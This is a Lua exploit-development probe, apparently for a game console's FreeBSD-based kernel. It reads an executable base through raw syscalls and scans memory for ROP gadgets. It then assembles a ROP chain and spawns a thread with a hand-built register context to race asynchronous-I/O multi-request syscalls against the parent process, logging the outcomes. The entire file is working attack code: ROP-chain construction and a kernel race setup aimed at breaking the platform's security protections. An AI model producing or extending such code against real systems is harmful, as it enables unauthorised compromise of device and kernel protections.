-- CRASH_CLASS: HIGH
-- PROBE 904a: minimal spawn test. Nothing but a child that calls getpid and stores rax.
-- If this corrupts stdout, the spawn harness itself is the fault in 902a/902b/903b;
-- if it is clean, the aio interaction is.
print("=== PROBE 904a: minimal child spawn ===")
local function to_num(v)
    if type(v)=="table" then
        if v.tonumber then local n=v:tonumber() if n then return n end end
        if v.h then return v.h*4294967296+v.l end
    end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end
local fn=to_num(syscall.pipe.fn_addr)
print("[0] pid="..tostring(to_num(native.fcall_with_rax(syscall.pipe.fn_addr,20))))
local info=memory.alloc(0x200); wd(info,0x160)
pcall(function() mk(593)(uint64(0),uint64(info)) end)
local ebase=(rd(info+0x10C) or 0)*4294967296+(rd(info+0x108) or 0)
local function find_pat(base,limit,pat)
    local off=0
    while off<limit do local want=limit-off; if want>0x1000 then want=0x1000 end
        local ok,s=pcall(function() return memory.read_buffer(base+off,want) end)
        if not ok or type(s)~="string" then return nil end
        local i=string.find(s,pat,1,true); if i then return base+off+i-1 end
        off=off+want end
end
local pop_rax=find_pat(ebase,0x494000,string.char(0x58,0xC3))
local pop_rdi=find_pat(ebase,0x494000,string.char(0x5F,0xC3))
local pop_rsi=find_pat(ebase,0x494000,string.char(0x5E,0xC3))
local pop_rdx=find_pat(ebase,0x494000,string.char(0x5A,0xC3))
local pop_rcx=find_pat(ebase,0x494000,string.char(0x59,0xC3))
local store  =find_pat(ebase,0x494000,string.char(0x48,0x89,0x07,0xC3))
local jmp_g  =find_pat(ebase,0x494000,string.char(0xEB,0xFE))
print(string.format("[0] gadgets rax=%s rdi=%s store=%s jmp=%s",
  tostring(pop_rax),tostring(pop_rdi),tostring(store),tostring(jmp_g)))
local page=0x4000
local function mmap(px) local _,a=pcall(function() return mk(477)(uint64(0),uint64(px),uint64(3),uint64(0x1002),uint64(0xFFFFFFFF),uint64(0)) end); local v=to_num(a); if v~=0 then zero(v,px) end; return v end
local Ctx={MAGIC=0x108,TYPE=0x110,CS=0x0C0,RIP=0x0E0,RSP=0x0F8,SS=0x100,RDI=0x048,RSI=0x050,RDX=0x058,RCX=0x060,R8=0x068,RAX=0x078}
local out=mmap(page)
local ctx=memory.alloc(0x500)
local tb=memory.alloc(8)
local ts=memory.alloc(16)
local function sleep_ms(ms) wq(ts,uint64(0)); wq(ts+8,uint64(ms*1000000)); pcall(function() mk(240)(uint64(ts),uint64(0)) end) end
local sv=memory.alloc(8); zero(sv,8)
pcall(function() mk(135)(uint64(1),uint64(1),uint64(0),uint64(sv)) end)
local fd=rd(sv); print("[1] socketpair fd="..tostring(fd))
local N=8
local reqs=memory.alloc(0x28*N); zero(reqs,0x28*N)
local buf=memory.alloc(0x1000); zero(buf,0x1000)
local b=to_num(buf)
for i=0,N-1 do local r=reqs+i*0x28
  wd(r+0x08,0x1000); wd(r+0x10,b%4294967296); wd(r+0x14,math.floor(b/4294967296)); wd(r+0x20,fd) end
local ids=memory.alloc(64); zero(ids,64)
local st=memory.alloc(64); local er=memory.alloc(0x200); local er2=memory.alloc(0x200)
local PASSES=8
local function spawn_multi()
    local block=mmap(page*4); local start=block+page*4-0x1000
    local ch={}
    for p=1,PASSES do
        ch[#ch+1]=pop_rdi ch[#ch+1]=to_num(ids)
        ch[#ch+1]=pop_rsi ch[#ch+1]=N
        ch[#ch+1]=pop_rdx ch[#ch+1]=to_num(er)+(p-1)*0x20
        ch[#ch+1]=pop_rax ch[#ch+1]=662
        ch[#ch+1]=fn
    end
    ch[#ch+1]=pop_rax ch[#ch+1]=431
    ch[#ch+1]=fn
    ch[#ch+1]=jmp_g
    for k=1,#ch do wq(start+(k-1)*8,uint64(ch[k])) end
    zero(ctx,0x500)
    wq(ctx+Ctx.MAGIC,uint64(0x480)); wq(ctx+Ctx.TYPE,uint64(0x10000))
    wq(ctx+Ctx.CS,uint64(0x43)); wq(ctx+Ctx.SS,uint64(0x3B))
    wq(ctx+Ctx.RIP,uint64(fn)); wq(ctx+Ctx.RSP,uint64(start))
    wq(ctx+Ctx.RDI,uint64(0)); wq(ctx+Ctx.RAX,uint64(662))
    wq(tb,uint64(0))
    return to_num(mk(430)(uint64(ctx),uint64(tb),uint64(0))), #ch
end
for round=1,5 do
    zero(ids,64); zero(st,64); zero(out,0x40); zero(er,0x200); zero(er2,0x200)
    local o=pcall(function() return mk(669)(uint64(0x1001),uint64(reqs),uint64(N),uint64(3),uint64(ids)) end)
    if not o then print("[R"..round.."] submit FAIL") break end
    pcall(function() mk(666)(uint64(ids),uint64(N),uint64(st)) end)
    pcall(function() mk(664)(uint64(ids),uint64(N),uint64(st)) end)
    local tid,ln=spawn_multi()
    local pz=0
    for p=1,PASSES do
        local okp=pcall(function() return mk(662)(uint64(ids),uint64(N),uint64(er2+(p-1)*0x20)) end)
        if okp then
            for i=0,N-1 do if (rd(er2+(p-1)*0x20+i*4) or 1)==0 then pz=pz+1 end end
        end
    end
    sleep_ms(80)
    local cz=0; local cbusy=0; local cesrch=0
    for p=1,PASSES do
      for i=0,N-1 do
        local v=rd(er+(p-1)*0x20+i*4) or 0
        if v==0 then cz=cz+1 elseif v==0x80020010 then cbusy=cbusy+1 elseif v==0x80020003 then cesrch=cesrch+1 end
      end
    end
    print(string.format("[R%d] chain=%d child zeros=%d busy=%d esrch=%d | parent zeros=%d | alive=%s",
      round,ln,cz,cbusy,cesrch,pz,tostring(to_num(native.fcall_with_rax(syscall.pipe.fn_addr,20)))))
end
print("[Z] done alive="..tostring(to_num(native.fcall_with_rax(syscall.pipe.fn_addr,20))))
